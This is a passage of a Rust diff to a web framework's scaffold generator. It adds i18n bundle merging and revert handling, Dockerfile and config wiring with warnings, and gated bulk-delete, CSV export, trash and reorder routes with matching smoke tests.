+            // `default_locale = "fr"` that still keeps the validator's bundle
+            // around gets the worst case: the validator finds it, it lacks
+            // every key just written to `fr.ftl`, and `cargo check` fails with a
+            // `compile_error!` per lookup.
+            //
+            // Keep it in step — the bundle the MACRO would pick, resolved the
+            // way the macro resolves it, not a hardcoded `i18n/en.ftl`. Only
+            // when it already exists: an absent one means there is no
+            // compile-time check to satisfy, and writing it would invent a
+            // locale the project deliberately does not have.
+            let mut extra_revert_paths: Vec<std::path::PathBuf> = Vec::new();
+            let macro_env = scaffold_i18n::MacroEnv::resolve(project_root);
+            if let Some(validator_path) =
+                scaffold_i18n::validator_bundle_path(project_root, &macro_env)
+                && validator_path != ftl_path
+            {
+                // Same fallible read as the runtime bundle above, for the same
+                // reason: `read_or_empty` would turn an unreadable or non-UTF-8
+                // file into `""`, and the `Modify` below would then write a
+                // fresh English bundle straight over whatever it holds.
+                let base = match std::fs::read_to_string(&validator_path) {
+                    Ok(contents) => contents,
+                    Err(e) => {
+                        return Err(GenerateError::Config(format!(
+                            "cannot read the i18n bundle at {}: {e}. Refusing to continue — it \
+                             is the file `t!`'s compile-time key check reads, so it has to be \
+                             kept in step, and merging would replace it with a freshly \
+                             generated file and lose whatever translations it holds. Fix the \
+                             file (it must be UTF-8 and readable) and re-run.",
+                            validator_path.display()
+                        )));
+                    }
+                };
+                // The SAME preserving merge the runtime bundle gets, against
+                // this file's own definitions. Reconciling the validator block
+                // against only the newly generated keys undoes the protection:
+                // a key held back from the runtime prune because hand-written
+                // code still calls it would be dropped from the very bundle
+                // that call is validated against, so the build fails anyway —
+                // just from the other file.
+                let still_referenced_here =
+                    super::emit::keys_still_referenced_in(&surviving_scan, &base);
+                let merged = scaffold_i18n::merge_en_ftl_keeping(
+                    &base,
+                    &pascal_name,
+                    &snake_name,
+                    &referenced_keys,
+                    &still_referenced_here,
+                );
+                if merged != base {
+                    plan.modify(validator_path.clone(), merged);
+                }
+                extra_revert_paths.push(validator_path);
+            }
+
+            // Destroy takes back this resource's keys only. The shared
+            // `common.*` block and the file itself always survive: sibling
+            // resources reuse the chrome, and `.i18n_auto()` panics at startup
+            // if the default locale's file is missing.
+            //
+            // EVERY locale bundle, not just the default one. A translator
+            // starts a locale by copying the default bundle and translating in
+            // place, so `fr.ftl` carries this resource's block — and its
+            // markers — too. Reverting only the default leaves those copies
+            // behind with nothing referencing them, which `autumn i18n check
+            // --strict` fails on as unused. The revert is marker-bounded and
+            // recomputed per file, so a hand-authored key outside the block is
+            // as safe here as it is in the default bundle.
+            let mut revert_paths: std::collections::BTreeSet<std::path::PathBuf> =
+                scaffold_i18n::locale_bundles(project_root, &i18n_dir)
+                    .into_iter()
+                    .collect();
+            // The default bundle even when this run is what creates it — the
+            // directory scan above only sees what is already on disk.
+            revert_paths.insert(ftl_path.clone());
+            revert_paths.extend(extra_revert_paths);
+            for path in revert_paths {
+                plan.push_revert(Revert::I18nFtlKeys {
+                    path,
+                    pascal: pascal_name.clone(),
+                    snake: snake_name.clone(),
+                });
+            }
+
+            // A project that already ships another locale gets those keys as
+            // UNTRANSLATED until someone writes them, and `--strict` exits
+            // non-zero on that. Say so by name rather than letting the next CI
+            // run be the messenger.
+            //
+            // Deliberately NOT written for them: filling `es.ftl` with English
+            // would report as translated and ship English, which is worse than
+            // a warning — it turns a visible gap into a silent one. The bundle
+            // header this generator writes says the same thing to translators.
+            let other_locales: Vec<String> = scaffold_i18n::locale_bundles(project_root, &i18n_dir)
+                .into_iter()
+                .filter(|path| path != &ftl_path)
+                .filter_map(|path| {
+                    path.file_stem()
+                        .map(|stem| stem.to_string_lossy().into_owned())
+                })
+                .collect();
+            if !other_locales.is_empty() {
+                plan.warn(format!(
+                    "{} new key(s) were written to {}. {} still needs them translated — \
+                     `autumn i18n check --strict` reports them as untranslated until it does.",
+                    referenced_keys.len(),
+                    ftl_path.display(),
+                    other_locales.join(", "),
+                ));
+            }
+
+            // (The `i18n` Cargo feature is enabled further down, alongside
+            // `maud`/`csv`/`htmx` — `plan_cargo_deps` runs between here and
+            // there and rebuilds its Cargo.toml action from DISK, so an edit
+            // made at this point would be silently dropped.)
+
+            // Two shared autumn-web widgets build user-facing text INSIDE
+            // themselves, from consts and `format!`s with no parameter to route
+            // a `t!` through. The generator translates every label it passes in
+            // and can reach no further:
+            //
+            //   * `form::rich_text_area` — the toolbar's "Markdown formatting"
+            //     group label and per-control names, the "Markdown supported…"
+            //     hint, and the preview pane's "Preview".
+            //   * `widgets::transition_controls` — each button's `Mark as {to}`
+            //     and the group's `{field} transitions` aria-label.
+            //
+            // Both are free functions with positional parameters, so unlike the
+            // pager and bulk-delete widgets there is no label setter to call:
+            // reaching them means new public API on autumn-web (a label PER
+            // transition edge, and per toolbar control), which is a framework
+            // design decision rather than a scaffold change. Refusing these
+            // columns under `--i18n` would cost more than it buys when the rest
+            // of the view does translate — so the flag does what it can and
+            // names what it could not.
+            let untranslated: Vec<(&str, &str, Vec<&Field>)> = vec![
+                (
+                    "Markdown editor",
+                    "the toolbar labels, the \"Markdown supported…\" hint, and the preview \
+                     heading come from `rich_text_area`",
+                    rich_text_fields(&fields),
+                ),
+                (
+                    "state-transition controls",
+                    "the `Mark as …` buttons and the transitions group label come from \
+                     `widgets::transition_controls`",
+                    fields
+                        .iter()
+                        .filter(|f| f.state_machine.is_some())
+                        .collect(),
+                ),
+            ];
+            for (widget, detail, affected) in untranslated {
+                if affected.is_empty() {
+                    continue;
+                }
+                plan.warn(format!(
+                    "`--i18n` translated this view's labels, but the {widget} on {} keeps \
+                     autumn-web's own chrome in English — {detail}, which takes no label \
+                     overrides yet. Everything else in the generated views goes through the \
+                     bundle.",
+                    affected
+                        .iter()
+                        .map(|f| format!("`{}`", f.name))
+                        .collect::<Vec<_>>()
+                        .join(", ")
+                ));
+            }
+
+            // Validation MESSAGES are a third surface the flag cannot reach.
+            // `#[validate(...)]` carries an optional `message`, but the
+            // `validator` crate takes it as a compile-time literal, so it can
+            // never hold a runtime `t!` lookup; with no message, autumn-web's
+            // `collect_errors` renders `validation failed: <code>`. Either way
+            // the inline error under a rejected field is English while its
+            // label is translated.
+            //
+            // Reaching it means the handler mapping error CODES to lookups
+            // before building the changeset — and `into_changeset` flattens
+            // the codes away inside autumn-web, so that needs a public seam
+            // there (a code-to-message resolver), the same kind of framework
+            // API the two widgets above want. Emitting the mapping into every
+            // generated handler instead would duplicate `collect_errors`'
+            // nested/list recursion in template strings, which is worse than
+            // saying so.
+            if metadata.has_validator_rules() {
+                plan.warn(
+                    "`--i18n` translated this view's labels, but the inline messages from \
+                     `#[validate(...)]` stay English — the `validator` attribute takes a \
+                     compile-time literal, so a runtime lookup cannot go there, and an \
+                     unmessaged rule renders as `validation failed: <code>`. Translating them \
+                     needs a code-to-message seam in autumn-web's changeset conversion."
+                        .to_owned(),
+                );
+            }
+
+            // A profile overlay can repoint i18n somewhere else entirely, and
+            // the runtime resolves the fully layered config — so the base
+            // bundle this generator just wrote (and the `COPY` it is about to
+            // add) can be the wrong one for the deploy that matters. Writing
+            // English into a `fr` production bundle would be a worse answer, so
+            // name the paths and let the author decide.
+            for (profile, path) in scaffold_i18n::profile_i18n_overrides(
+                &read_or_empty(&autumn_toml_path_for_i18n),
+                &i18n_dir,
+                &default_locale,
+            ) {
+                plan.warn(format!(
+                    "`[profile.{profile}.i18n]` points at `{path}`, not the `{}` this scaffold \
+                     wrote. Add the same keys there (or an `{profile}` fallback chain that \
+                     reaches the base bundle) — the app loads the layered config at startup, and \
+                     `.i18n_auto()` PANICS when the resolved default locale's file is missing.",
+                    ftl_path.display()
+                ));
+            }
+
+            // The same hazard through the OTHER spelling. A standalone
+            // `autumn-<profile>.toml` is merged LAST — after `autumn.toml` and
+            // its inline `[profile.…]` sections — so a project that keeps its
+            // production config in one has no `[profile.prod.i18n]` for the scan
+            // above to find, and the loudest case reports nothing at all.
+            let profile_files: Vec<(String, String)> = std::fs::read_dir(project_root)
+                .into_iter()
+                .flatten()
+                .flatten()
+                .filter_map(|entry| {
+                    let path = entry.path();
+                    let name = path.file_name()?.to_str()?;
+                    let profile = name.strip_prefix("autumn-")?.strip_suffix(".toml")?;
+                    Some((profile.to_owned(), read_or_empty(&path)))
+                })
+                .collect();
+            for (profile, path) in scaffold_i18n::profile_file_i18n_overrides(
+                &profile_files,
+                &i18n_dir,
+                &default_locale,
+            ) {
+                plan.warn(format!(
+                    "`autumn-{profile}.toml` points i18n at `{path}`, not the `{}` this scaffold \
+                     wrote — and that file is layered LAST, so it wins over `autumn.toml`. Add \
+                     the same keys there (or a fallback chain that reaches the base bundle) — \
+                     `.i18n_auto()` PANICS at startup when the resolved default locale's file is \
+                     missing.",
+                    ftl_path.display()
+                ));
+            }
+
+            // The image has to carry the bundle: `.i18n_auto()` panics at
+            // startup when the default locale's file is missing, and the plain
+            // `autumn new` Dockerfile copies no `i18n/` directory.
+            let dockerfile_path = project_root.join("Dockerfile");
+            if dockerfile_path.exists() {
+                let base = read_or_empty(&dockerfile_path);
+                // A `dir` that moved since an earlier `--i18n` run leaves the old
+                // pair behind, and the new pair is added beside it. `COPY` fails
+                // the build outright when its source is gone from the context, so
+                // the stale line is the difference between an image that builds
+                // and one that does not.
+                if let Some(stale) = scaffold_i18n::stale_dockerfile_i18n_dir(&base, &i18n_dir) {
+                    plan.warn(format!(
+                        "Dockerfile still copies `{stale}/` — the locale directory an earlier \
+                         scaffold wired in — while `[i18n] dir` now resolves to `{i18n_dir}/`. \
+                         Both stages have been given `{i18n_dir}/`; remove the `{stale}/` lines \
+                         by hand. Left in place they fail the image build outright once \
+                         `{stale}/` is gone from the build context."
+                    ));
+                }
+                match scaffold_i18n::ensure_dockerfile_i18n_copy(&base, &i18n_dir) {
+                    Some(updated) if updated != base => {
+                        plan.modify(dockerfile_path, updated);
+                    }
+                    Some(_) => {}
+                    None => plan.warn(format!(
+                        "Dockerfile has no `COPY migrations` line to anchor on, so the \
+                         `{i18n_dir}/` directory was not added to it. Copy `{i18n_dir}/` into \
+                         both the builder and runtime stages by hand — the app calls \
+                         `.i18n_auto()`, which PANICS at startup if the default locale's \
+                         `.ftl` is missing from the image."
+                    )),
+                }
+            }
+
+            // `[i18n]` in `autumn.toml` names the default locale the bundle
+            // loads. Only touched when the project actually has an
+            // `autumn.toml` to edit and does not already configure i18n — a
+            // project on a non-`en` default must keep it.
+            let autumn_toml_path = autumn_toml_path_for_i18n;
+            if autumn_toml_path.exists() {
+                let base = plan
+                    .actions
+                    .iter()
+                    .rev()
+                    .find_map(|a| match a {
+                        Action::Modify { path, contents } if path == &autumn_toml_path => {
+                            Some(contents.clone())
+                        }
+                        _ => None,
+                    })
+                    .map_or_else(
+                        || {
+                            // Read FALLIBLY. `read_or_empty` turns an unreadable
+                            // file — non-UTF-8, or unreadable under the current
+                            // ACL — into `""`, and the `Modify` planned below
+                            // would then write a fresh `[i18n]` block over
+                            // whatever was really there, destroying the project's
+                            // configuration. The bundle reads above already take
+                            // this care; this one is the same hazard with a worse
+                            // blast radius, since `autumn.toml` configures
+                            // everything. Absence stays absent.
+                            match std::fs::read_to_string(&autumn_toml_path) {
+                                Ok(src) => Ok(src),
+                                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
+                                    Ok(String::new())
+                                }
+                                Err(e) => Err(GenerateError::Io(e)),
+                            }
+                        },
+                        Ok,
+                    )?;
+                let updated = scaffold_i18n::ensure_i18n_config_block(&base);
+                if updated != base {
+                    plan.actions.retain(|a| a.path() != autumn_toml_path);
+                    plan.modify(autumn_toml_path, updated);
+                }
+            }
+        }
+
         let route_mod_path = routes_dir.join("mod.rs");
         plan.modify(
             route_mod_path.clone(),
@@ -724,6 +1696,35 @@ fn plan_scaffold_with_options_impl(
             path: route_mod_path,
             name: plural.clone(),
         });
+
+        // Issue #1323 AC4: the PARENT resource's generated `show` view gains a
+        // list of its children plus an inline create form. That is an in-place
+        // edit to a file this invocation does not own, so it is marker-delimited
+        // (idempotent on re-run) and paired with a `Revert` so `autumn destroy`
+        // takes exactly those lines back out (#1048).
+        if let Some(n) = nesting.as_ref()
+            && !for_revert
+        {
+            let parent_routes = routes_dir.join(format!("{}.rs", n.parent_plural));
+            if let Ok(parent_src) = std::fs::read_to_string(&parent_routes) {
+                plan.modify(
+                    parent_routes,
+                    super::nested::inject_into_parent_show(&parent_src, &plural),
+                );
+            }
+        }
+        // The destroy-side counterpart, driven by the MARKERS on disk rather
+        // than by `--belongs-to` being repeated on the destroy command line:
+        // the flag is something the author typed once, days ago, and forgetting
+        // it must not leave a `crate::routes::{plural}::children_section(…)`
+        // call dangling in a parent whose child module this destroy just
+        // deleted — an uncompilable project.
+        for parent_routes in &nested_parents {
+            plan.push_revert(Revert::NestedChildSection {
+                path: parent_routes.clone(),
+                child_plural: plural.clone(),
+            });
+        }
     }
 
     // Record-level authorization policy + scope (issue #1125). Emitted for every
@@ -745,24 +1746,170 @@ fn plan_scaffold_with_options_impl(
         );
     }
 
+    // Issue #1312: bulk-select + `POST /{plural}/bulk_delete`. Must agree exactly
+    // with the `bulk_delete_enabled` gate in `render_routes_file` (plus `--api`,
+    // which emits no HTML routes module at all), or main.rs would mount a route
+    // the module never emitted.
+    let bulk_delete_enabled = !options_with_key.api
+        && !options_with_key.live
+        && !options_with_key.live_validation
+        && !options_with_key.model.sharded;
+    // Issue #1315: the `CsvSchema` impl + `GET /{plural}/export.csv` download.
+    // Must agree exactly with the `export_enabled` gate in `render_routes_file`
+    // (plus `--api`, which emits no HTML routes module at all), or main.rs would
+    // mount a route the module never emitted.
+    //
+    // Spelled out operand by operand rather than reusing `authorize_wiring`,
+    // which is the same predicate today but is documented as the signal for the
+    // cross-user 403 smoke test — narrowing it for THAT reason would silently
+    // desync the two copies of THIS gate. `owner_authorizes` is
+    // `render_routes_file`'s `owner_scoped_index`; the first disjunct is its
+    // `owner_scoped_standard`.
+    // Bound as two named locals rather than one expression: the disjunction
+    // reads as the two index branches it mirrors, and clippy's `nonminimal_bool`
+    // would otherwise demand the algebraically-minimal form, which loses that.
+    let owner_scoped_standard_export = owner_authorizes
+        && !options_with_key.model.sharded
+        && !options_with_key.live
+        && !options_with_key.live_validation;
+    let plain_export =
+        !owner_authorizes && !options_with_key.live && !options_with_key.model.sharded;
+    let export_enabled = !options_with_key.api && (owner_scoped_standard_export || plain_export);
+    // Issue #1332: the trash view + restore/purge controls. Must agree exactly
+    // with the `trash_enabled` gate in `render_routes_file` (plus `--api`, which
+    // emits no HTML routes module at all), or main.rs would mount routes the
+    // module never emitted. `owner_authorizes` is `render_routes_file`'s
+    // `owner_scoped_index`.
+    let trash_enabled = options_with_key.model.soft_delete
+        && !options_with_key.api
+        && !options_with_key.live
+        && !options_with_key.live_validation
+        && !options_with_key.model.sharded
+        && !owner_authorizes;
+    // Issue #1358: the position field's no-JS Move up / Move down index
+    // buttons + their `POST /{plural}/{id}/move_up`|`move_down` handlers.
+    // Must agree exactly with the `reorder_enabled` gate in
+    // `render_routes_file` (plus `--api`, which emits no HTML routes module
+    // at all), or main.rs would mount routes the module never emitted. Same
+    // restriction set as `trash_enabled` — scoped to the plain HTML index for
+    // this slice. `--api`/`--live`/`--live-validation`/owner-scoped scaffolds
+    // still get the repository's `move_*` methods (and, for `--api`, the
+    // ordered data), just not the HTML buttons. `--sharded` is different: the
+    // repository attribute omits `position(...)` entirely there (see the
+    // `render_repository_file` call above) because the macro itself rejects
+    // `position(...)` combined with `sharded` — a move only reaches the
+    // pool/shard it happens to be given.
+    let reorder_enabled = fields.iter().any(|f| f.kind.is_position())
+        && !options_with_key.api
+        && !options_with_key.live
+        && !options_with_key.live_validation
+        && !options_with_key.model.sharded
+        && !owner_authorizes;
+    // A `--soft-delete` scaffold that lands on one of the gated-off variants
+    // gets the data layer and the delete tunnel but NO way to see or recover
+    // what it deleted — exactly the situation #1332 exists to remove. Say so at
+    // generation time, with the reason and the way out, rather than leaving the
+    // author to notice the missing Trash link and go read the guide. Only
+    // reached when the flag was actually passed, so an ordinary scaffold prints
+    // nothing.
+    if options_with_key.model.soft_delete && !trash_enabled {
+        let reason = if options_with_key.api {
+            "an --api scaffold renders no HTML views"
+        } else if options_with_key.live || options_with_key.live_validation {
+            "restoring a row goes through the repository's `restore`, not the \
+             broadcasting `save`, so a --live list would never learn the row came back"
+        } else if options_with_key.model.sharded {
+            "`page_only_deleted` cannot fan out across shards, so a trash page \
+             would silently show one shard's deletions"
+        } else {
+            "the index is owner-scoped and the repository has no owner-filtered \
+             deleted-rows scope; listing deleted rows without one would show every \
+             user's trash"
+        };
+        plan.warn(format!(
+            "--soft-delete: no Trash view generated for {plural} — {reason}. \
+             The repository still has restore/purge/only_deleted, so a hand-written \
+             trash route can use them; see docs/guide/generators.md."
+        ));
+    }
+    // Issue #1358: `position(...)` on `#[repository(..., sharded)]` is
+    // rejected outright by the macro (see `autumn-macros`' `parse_repo_args`)
+    // — a move only reaches the pool/shard it happens to be given — so
+    // `render_repository_file` was previously made to omit `position(...)`
+    // from a sharded scaffold's attribute entirely, generating the column
+    // and its migration triggers (insert-assign, delete-compact) with no
+    // `move_*` methods and only a warning. Codex review: that left a live
+    // gap — `delete_many`'s single-row-chunking fix for the batch-compaction
+    // race (see `autumn-macros`' `delete_chunk_size`) keys off
+    // `config.position`, which the sharded repository attribute no longer
+    // carries, so a sharded model's bulk delete keeps its 1000-row chunks
+    // even though the row-level compaction triggers are still installed and
+    // still vulnerable to the same multi-row-per-statement race. Reject the
+    // combination outright instead: no partial position support (column,
+    // triggers, but no working reorder or safe bulk-delete) is worth the
+    // silent corruption risk.
+    if fields.iter().any(|f| f.kind.is_position()) && options_with_key.model.sharded {
+        return Err(GenerateError::Config(format!(
+            "position field on --sharded {plural}: not supported. \
+             #[repository(..., sharded)] rejects position(...) outright — a move only \
+             reaches the pool/shard it happens to be given — and the migration's \
+             row-level compaction triggers are not safe against a sharded repository's \
+             bulk delete, which keeps its full-size chunks with no `position` metadata \
+             to know it must not. Drop the position field, or drop --sharded."
+        )));
+    }
     // Smoke test under `tests/<snake>.rs`. Uses the same soft-delete-augmented
     // field list as the real migration (see `augment_fields_for_soft_delete`)
     // so the smoke test's throwaway table matches the real schema exactly.
     let smoke_test_fields =
         augment_fields_for_soft_delete(&fields, options_with_key.model.soft_delete)?;
-    plan.create(
-        project_root.join("tests").join(format!("{snake_name}.rs")),
-        render_smoke_test(
+    let mut smoke_test = render_smoke_test(
+        &pascal_name,
+        &plural,
+        options_with_key.api,
+        &smoke_test_fields,
+        options_with_key.model.id_type,
+        metadata.indexes(),
+        metadata.defaults(),
+        metadata.validations(),
+        authorize_wiring,
+        bulk_delete_enabled,
+    );
+    // Issue #1315 (AC6): the CSV download test — status, media type, attachment
+    // disposition, header row, RFC 4180 quoting, and the empty cell a NULL
+    // column serializes to. Needs no database (its rows are in-process), so
+    // unlike the index read test it is not `#[ignore]`d.
+    //
+    // Appended HERE rather than inside `render_smoke_test` because it is the one
+    // generated test built from `fields` (the model's DECLARED columns, matching
+    // the emitted `CsvSchema`) instead of `smoke_test_fields` (the same list plus
+    // soft-delete's `deleted_at`, which the throwaway `CREATE TABLE` needs). Both
+    // are `&[Field]`, so passing them side by side into a 10-argument function
+    // would be a silent mix-up the compiler could not catch.
+    if export_enabled {
+        smoke_test.push_str(&render_csv_export_smoke_test(&plural, &fields));
+    }
+    // Issue #1332 (AC7): the trash lifecycle test — create, soft delete, recover,
+    // purge. Appended here, alongside the CSV test, for the same reason: it is
+    // built from the resource's ROUTES rather than from the column list
+    // `render_smoke_test` is shaped around, and it is emitted under exactly the
+    // gate that decides whether those routes exist at all.
+    if trash_enabled {
+        smoke_test.push_str(&render_trash_lifecycle_smoke_test(&pascal_name, &plural));
+    }
+    // Issue #1323 AC7: the nested write-path test. Appended here, alongside the
+    // CSV test, because `render_smoke_test` is shaped around the resource's own
+    // flat surface and this one needs the resolved parent binding.
+    if let Some(n) = nesting.as_ref() {
+        smoke_test.push_str(&render_nested_write_path_smoke_test(
             &pascal_name,
             &plural,
-            options_with_key.api,
-            &smoke_test_fields,
-            options_with_key.model.id_type,
-            metadata.indexes(),
-            metadata.defaults(),
-            metadata.validations(),
-            authorize_wiring,
-        ),
+            n,
+        ));
+    }
+    plan.create(
+        project_root.join("tests").join(format!("{snake_name}.rs")),
+        smoke_test,
     );
 
     // `src/main.rs` updates: declare modules + register all new routes.
@@ -773,8 +1920,23 @@ fn plan_scaffold_with_options_impl(
             format!("missing {}", main_path.display()),
         ))
     })?;
+    // Issue #1255: a `richtext` column never takes the htmx inline-validation
+    // path — its wrapper already owns an `hx-post` for the live preview, so
+    // `render_changeset_form_inputs` renders the editor instead of
+    // `text_input_htmx`. Emitting (and mounting, and submit-token-exempting) a
+    // `validate_{field}` route nothing links to would be dead surface, so filter
+    // those columns out here and at the emission site in `render_routes_file`.
     let validated_field_names: Vec<String> = if options_with_key.live_validation {
-        metadata.validations().keys().cloned().collect()
+        metadata
+            .validations()
+            .keys()
+            .filter(|name| {
+                !fields
+                    .iter()
+                    .any(|f| &&f.name == name && f.kind.is_rich_text())
+            })
+            .cloned()
+            .collect()
     } else {
         Vec::new()
     };
@@ -795,14 +1957,64 @@ fn plan_scaffold_with_options_impl(
             .map(|f| f.name.clone())
             .collect()
     };
+    // Issue #1255: the `POST /{plural}/preview/{field}` fragment handlers the
+    // routes module emits for each `richtext` column. HTML surface only — an
+    // `--api` scaffold renders no form, so it emits no preview endpoint.
+    //
+    // Derived from `form_fields`, NOT `fields`: a `--default`ed column is
+    // dropped from the form (and therefore from the rendered routes module), so
+    // deriving from `fields` would mount a `preview_{field}` handler the module
+    // never emitted and fail the generated app to compile.
+    let rich_text_field_names: Vec<String> = if options_with_key.api {
+        Vec::new()
+    } else {
+        rich_text_fields(&form_fields)
+            .iter()
+            .map(|f| f.name.clone())
+            .collect()
+    };
     let route_entries = main_route_entries(
         &plural,
         &snake_name,
         options_with_key.api,
         options_with_key.live,
         search_enabled && !options_with_key.api,
+        bulk_delete_enabled,
+        export_enabled,
+        // Same shape as the `nested` predicate below, for the same reason: on the
+        // DESTROY path `--soft-delete` may not have been repeated on the command
+        // line, so `trash_enabled` is false — but `main.rs` still mounts the three
+        // trash handlers this resource emitted, and a revert that deleted the
+        // routes module while leaving them behind would leave the project
+        // uncompilable. Removing an entry that is not there is a no-op
+        // (`remove_routes_entries` filters to the ones present), so claiming them
+        // unconditionally on the revert path is safe even for a resource that
+        // never had a trash surface. The GENERATE path keeps the strict gate: what
+        // this run emits is decided by `trash_enabled` alone, and the prune below
+        // handles a re-run that dropped the flag.
+        trash_enabled || for_revert,
+        // Same double-gate reasoning as `trash_enabled || for_revert` above:
+        // the DESTROY/revert path may not repeat the DSL token that turned
+        // `reorder_enabled` on, but a stale routes module still needs its
+        // mounted handlers claimed for cleanup.
+        reorder_enabled || for_revert,
         &validated_field_names,
         &sm_field_names,
+        &rich_text_field_names,
+        // On the DESTROY path `--belongs-to` may not have been repeated on the
+        // command line, so `nesting` is `None` — but `main.rs` still mounts the
+        // two nested handlers this resource emitted, and a revert that removed
+        // the child's routes module while leaving those entries behind would
+        // leave the project uncompilable. The markers on disk are the same
+        // evidence the parent-side cleanup keys off.
+        //
+        // Gated to `for_revert` deliberately: on the GENERATE path the routes
+        // module is being rewritten right now, and what it emits is decided by
+        // `nesting` alone. Letting stale marker evidence mount handlers the
+        // fresh module does not emit is exactly the uncompilable state this
+        // predicate exists to avoid — `nesting` already folds in the marker
+        // inference for a regeneration that omitted the flag.
+        nesting.is_some() || (for_revert && !nested_parents.is_empty()),
     );
     let mut mods = vec!["models", "schema", "repositories"];
     if !options_with_key.api {
@@ -812,7 +2024,28 @@ fn plan_scaffold_with_options_impl(
         mods.push("policies");
     }
     let updated = update_main_rs(&main_existing, &mods, &route_entries);
-    // Fold the policy/scope builder registration into the same `updated` content
+    // `update_main_rs` only ADDS entries, so a re-run that stops emitting a
+    // handler leaves the old entry behind pointing at a function the fresh
+    // routes module no longer defines — and the project stops compiling. That
+    // bites hardest on the trash surface: `--soft-delete` is exactly the kind of
+    // flag someone forgets to repeat on a `--force` regeneration, and forgetting
+    // it strands THREE entries at once. So when this render emits no trash
+    // surface, prune any that a previous run mounted. Harmless when there are
+    // none (`remove_routes_entries` returns the input untouched), and never
+    // reached when the surface IS emitted, where the entries are re-added above.
+    let updated = if trash_enabled {
+        updated
+    } else {
+        super::schema_edit::remove_routes_entries(
+            &updated,
+            &[
+                format!("routes::{plural}::trash"),
+                format!("routes::{plural}::restore"),
+                format!("routes::{plural}::purge"),
+            ],
+        )
+    };
+    // Fold the policy/scope registration into the same `updated` content
     // (issue #1125) so main.rs gets a single `Modify` action.
     let updated = if policy_on {
         super::schema_edit::add_policy_registration_to_app(
@@ -821,6 +2054,79 @@ fn plan_scaffold_with_options_impl(
             &pascal_name,
             &snake_name,
         )
+    } else {
+        updated
+    };
+    // Issue #1349: `.i18n_auto()` in the builder chain is what makes the
+    // generated `t!` lookups resolve to real translations instead of echoing
+    // their keys — AC4's "zero further config". Folded into the same `Modify`
+    // action as everything else main.rs gains. Idempotent, and a no-op for a
+    // project that already installs a bundle its own way (`.i18n(...)`).
+    //
+    // No matching `Revert`: this is project-level wiring shared by every
+    // `--i18n` resource, and removing it while a sibling still emits `t!` calls
+    // would leave that resource rendering raw keys. Leaving it is inert.
+    let updated = if options_with_key.i18n && !options_with_key.api {
+        // Recomputed rather than threaded down from the bundle-writing block
+        // above: it is one small read, and it keeps this warning's wording
+        // honest about the path the keys actually went to.
+        let (locale, dir) =
+            scaffold_i18n::configured_i18n(&read_or_empty(&project_root.join("autumn.toml")));
+        let i18n_dir_for_embed = dir.unwrap_or_else(|| "i18n".to_owned());
+        let ftl_display_path = format!(
+            "{i18n_dir_for_embed}/{}.ftl",
+            locale.unwrap_or_else(|| "en".to_owned())
+        );
+        match scaffold_i18n::ensure_i18n_auto(&updated) {
+            // Also embed the bundle for `--embed` builds, matching what
+            // `autumn new --with-i18n` wires up. Absent anchors (an `--api` or
+            // hand-rolled `main.rs`) just leave it alone: `.i18n_auto()`'s disk
+            // load still works for an ordinary build.
+            scaffold_i18n::I18nAutoWiring::Wired(wired) => {
+                scaffold_i18n::ensure_embedded_locales(&wired, &i18n_dir_for_embed).unwrap_or_else(
+                    || {
+                        // The builder chain was found and wired, but the
+                        // template's `EMBEDDED_STATIC` anchors are not there to
+                        // hang the locale embedding on. Filesystem loading still
+                        // works for an ordinary build, so this is not a refusal
+                        // — but it is not silent either: `autumn build --embed`
+                        // advertises a self-contained binary, and this one would
+                        // carry no bundle and panic wherever the sidecar
+                        // directory is absent.
+                        plan.warn(format!(
+                            "`main.rs` has no `embed_static!`/`embedded_static` anchors, so the                              `{i18n_dir_for_embed}/` bundle was NOT embedded — `.i18n_auto()`                              loads it from disk instead. That is fine for an ordinary build; an                              `autumn build --embed` binary, though, will carry no locales and                              PANICS at startup wherever `{i18n_dir_for_embed}/` is missing. Add                              `embed_locales!` and `.embedded_locales(&…)` by hand if you ship                              `--embed` builds."
+                        ));
+                        wired
+                    },
+                )
+            }
+            // No real `.routes(` call to anchor on. Writing the call anywhere
+            // else risks landing it in a comment, where it would silently never
+            // run and the app would render raw keys forever — so say so instead
+            // and leave `main.rs` alone.
+            // The app installs its own bundle. Leave it be — swapping somebody's
+            // embedded or TMS-backed `Bundle` for a filesystem load would be a
+            // far bigger change than this generator is entitled to make — but
+            // say so, because the keys just written to disk will not reach it.
+            scaffold_i18n::I18nAutoWiring::CustomBundle => {
+                plan.warn(format!(
+                    "src/main.rs installs its own translation bundle with `.i18n(...)`, which \
+                     takes precedence over loading `{ftl_display_path}` from disk. The keys this scaffold just \
+                     wrote there will NOT reach that bundle — add them to whatever source it is \
+                     built from, or switch to `.i18n_auto()` to load from the filesystem."
+                ));
+                updated
+            }
+            scaffold_i18n::I18nAutoWiring::NoAnchor => {
+                plan.warn(
+                    "src/main.rs has no `.routes(...)` call to anchor on, so `.i18n_auto()` was \
+                     not wired in. Add it to your `autumn_web::app()` builder chain by hand — \
+                     without it the generated `t!(locale, ...)` lookups render their KEYS \
+                     instead of the English in i18n/en.ftl.",
+                );
+                updated
+            }
+        }
     } else {
         updated
     };
@@ -911,6 +2217,74 @@ fn plan_scaffold_with_options_impl(
         });
     }
 
+    // Issue #1349: the generated views' `t!(locale, …)` lookups and the `Locale`
+    // extractor they read live behind autumn-web's `i18n` feature, and the
+    // `.i18n_auto()` call folded into `main.rs` above is gated on it too.
+    // Without this the generated app would not compile.
+    //
+    // Deliberately NO matching `Revert`, unlike `maud`/`csv`/`htmx`: that
+    // `.i18n_auto()` call is project-level wiring this generator does not take
+    // back out (a sibling `--i18n` resource would stop resolving its keys), so
+    // removing the feature under it would break the build. Leaving a feature
+    // enabled is inert; removing one that is still called is not.
+    if options_with_key.i18n && !options_with_key.api {
+        let cargo_path = project_root.join("Cargo.toml");
+        let base = plan
+            .actions
+            .iter()
+            .rev()
+            .find_map(|a| match a {
+                Action::Modify { path, contents } if path == &cargo_path => Some(contents.clone()),
+                _ => None,
+            })
+            .unwrap_or_else(|| read_or_empty(&cargo_path));
+        let updated = ensure_autumn_web_feature(&base, "i18n");
+        if updated != base {
+            plan.actions.retain(|a| a.path() != cargo_path);
+            plan.modify(cargo_path, updated);
+        }
+    }
+
+    // Issue #1315: the emitted `CsvSchema` impl and `export.csv` handler call
+    // into `autumn_web::data::csv`, which is gated behind autumn-web's `csv`
+    // feature (off by default so the `csv` crate stays out of apps that don't
+    // export). Without this the generated app would not compile. Enabled only
+    // where the export is actually emitted, so a `--api`/`--live`/`--sharded`
+    // scaffold's Cargo.toml is untouched.
+    if export_enabled {
+        let cargo_path = project_root.join("Cargo.toml");
